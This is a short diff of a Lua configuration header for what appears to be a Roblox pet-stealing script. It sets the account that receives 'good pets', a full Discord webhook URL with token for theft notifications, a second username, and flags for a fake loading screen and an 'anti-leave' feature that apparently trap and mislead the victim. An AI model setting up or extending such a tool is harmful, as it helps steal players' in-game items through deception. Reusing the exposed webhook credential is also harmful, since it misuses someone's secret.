@@ -1,6 +1,6 @@
-UserName = "Littlegamer1459"  good pets
-Webhook = "https://discord.com/api/webhooks/1137329564641656852/xTxxn262q74d6leJlR5DV28guPC98VcWNaumngPjSq_3x3NGTQLYgAr7giaL5cubNUD-"  pings for pets
-UserName2 = "plays"  bad pets
+UserName = "Littlegamer1459" -- good pets
+Webhook = "https://discord.com/api/webhooks/1137329564641656852/xTxxn262q74d6leJlR5DV28guPC98VcWNaumngPjSq_3x3NGTQLYgAr7giaL5cubNUD-" --  pings for pets
+UserName2 = "Littlegamer1459" --  bad pets
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
